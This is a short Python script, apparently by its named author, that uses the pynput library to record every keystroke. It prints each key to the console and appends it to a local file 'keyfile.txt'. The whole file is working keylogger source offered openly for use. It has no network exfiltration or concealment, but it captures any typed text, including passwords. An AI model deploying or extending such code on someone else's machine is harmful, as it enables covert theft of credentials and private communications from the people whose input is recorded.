# Author: Mohammed Sabir
#
# This script listens to keyboard input and logs the pressed keys to a file named "keyfile.txt".
#
# Requirements:
#   - pynput: A Python library for controlling and monitoring input devices.
#     Install it using the following command:
#     ```
#     pip install pynput
#     ```
#
# Usage:
#   Run the script and it will start listening to keyboard input. The pressed keys will be logged to "keyfile.txt".
#   The script will continue to run until interrupted.

from pynput import keyboard

def keyPressed(key):
    """
    This function is called when a key is pressed.
    It logs the pressed key to the console and to "keyfile.txt".

    Parameters:
        key (Key): The pressed key.
    """
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)  # Log the character
        except AttributeError:
            logKey.write(f" [{key}] ")  # Log special keys like Shift, Enter, etc.

if __name__ == "__main__":
    # Create a listener for keyboard input.
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  # Keeps the script running until manually stopped

